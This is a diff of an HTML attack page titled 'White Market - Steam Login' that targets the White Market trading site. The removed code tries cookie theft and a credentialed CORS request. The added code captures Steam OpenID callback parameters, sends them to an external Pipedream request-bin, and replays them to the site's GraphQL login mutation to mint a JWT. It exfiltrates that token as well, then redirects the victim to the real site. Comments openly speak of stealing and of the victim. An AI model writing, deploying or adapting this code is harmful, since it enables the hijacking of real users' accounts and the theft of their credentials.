@@ -1,102 +1,73 @@
 <!DOCTYPE html>
 <html>
-<head><title>White Market</title></head>
+<head><title>White Market - Steam Login</title></head>
 <body>
-<h1>Loading...</h1>
-<div id="status"></div>
+<h1>Connecting to Steam...</h1>
 <script>
-const status = document.getElementById('status');
 const REQUESTBIN = 'https://eo5dlnbgif530n8.m.pipedream.net';
 
-// Check what cookies are available on apixwhite.market
-const localCookies = document.cookie;
-console.log('=== COOKIES ON APIXWHITE.MARKET ===');
-console.log(localCookies);
+// Check if we're on the Steam callback
+const params = new URLSearchParams(window.location.search);
 
-status.innerHTML = 'Cookies on apixwhite.market:<br>' + (localCookies || 'NONE') + '<br><br>';
-
-// Check specifically for access-token
-if (localCookies.includes('access-token')) {
-    const jwt = localCookies.split(';').find(c => c.trim().startsWith('access-token=')).split('=')[1];
+if (params.has('openid.sig')) {
+    // User was redirected here from Steam - steal the OpenID params!
+    const steamAuth = {
+        openidNs: params.get('openid.ns'),
+        openidMode: params.get('openid.mode'),
+        openidOpEndpoint: params.get('openid.op_endpoint'),
+        openidClaimedId: params.get('openid.claimed_id'),
+        openidIdentity: params.get('openid.identity'),
+        openidReturnTo: params.get('openid.return_to'),
+        openidResponseNonce: params.get('openid.response_nonce'),
+        openidAssocHandle: params.get('openid.assoc_handle'),
+        openidSigned: params.get('openid.signed'),
+        openidSig: params.get('openid.sig')
+    };
     
-    console.log('=== SUCCESS - JWT STOLEN VIA COOKIE LEAKAGE ===');
-    console.log(jwt);
-    
-    status.innerHTML += '<strong>CRITICAL: JWT STOLEN FROM COOKIE!</strong><br>';
-    status.innerHTML += 'JWT: ' + jwt.substring(0, 100) + '...<br><br>';
-    
-    // Exfiltrate
+    // Send stolen Steam auth to our server
     fetch(REQUESTBIN, {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({
-            attack_method: 'DIRECT_COOKIE_THEFT',
-            jwt: jwt,
-            timestamp: new Date().toISOString(),
-            success: true
+            attack: 'STOLEN_STEAM_AUTH',
+            steamAuth: steamAuth,
+            timestamp: new Date().toISOString()
         })
     });
-} else {
-    console.log('=== Cookie did not leak - trying CORS attack ===');
-    status.innerHTML += 'Cookie did not leak to apixwhite.market<br>';
-    status.innerHTML += 'Trying CORS attack instead...<br><br>';
     
-    // CORS attack - make authenticated request and steal data
+    // Now use it to login and get JWT
     fetch('https://api.white.market/graphql/api', {
         method: 'POST',
         credentials: 'include',
-        headers: {
-            'Content-Type': 'application/json',
-            'x-accept-language': 'en_US'
-        },
+        headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({
-            query: 'query{__typename}',
-            operationName: 'Test'
+            query: 'mutation AuthSteam($steamAuth: SteamAuthInput!) { auth_steam(steamAuth: $steamAuth) { accessToken isNewPerson } }',
+            variables: {steamAuth: steamAuth},
+            operationName: 'AuthSteam'
         })
     })
-    .then(r => {
-        console.log('CORS response status:', r.status);
-        return r.json();
-    })
+    .then(r => r.json())
     .then(d => {
-        console.log('=== CORS ATTACK SUCCESS ===');
-        console.log(d);
-        
-        status.innerHTML += 'CORS attack worked!<br>';
-        status.innerHTML += 'Response: ' + JSON.stringify(d) + '<br>';
-        
-        fetch(REQUESTBIN, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({
-                attack_method: 'CORS_EXPLOITATION',
-                response: d,
-                timestamp: new Date().toISOString(),
-                success: true,
-                note: 'Can make authenticated requests and read responses'
-            })
-        });
-    })
-    .catch(e => {
-        console.error('=== CORS FAILED ===');
-        console.error(e);
-        
-        status.innerHTML += 'CORS attack failed: ' + e.message + '<br>';
-        
-        fetch(REQUESTBIN, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({
-                attack_method: 'FAILED',
-                error: e.message,
-                timestamp: new Date().toISOString()
-            })
-        });
+        if (d.data && d.data.auth_steam) {
+            // SUCCESS - got JWT!
+            fetch(REQUESTBIN, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    attack: 'JWT_GENERATED',
+                    jwt: d.data.auth_steam.accessToken,
+                    timestamp: new Date().toISOString()
+                })
+            });
+        }
     });
 }
 
-status.innerHTML += '<br>Redirecting in 10 seconds...';
-setTimeout(() => window.location.href = 'https://white.market', 10000);
+// Redirect victim to complete login
+setTimeout(() => {
+    window.location.href = 'https://white.market';
+}, 3000);
 </script>
 </body>
 </html>
+```
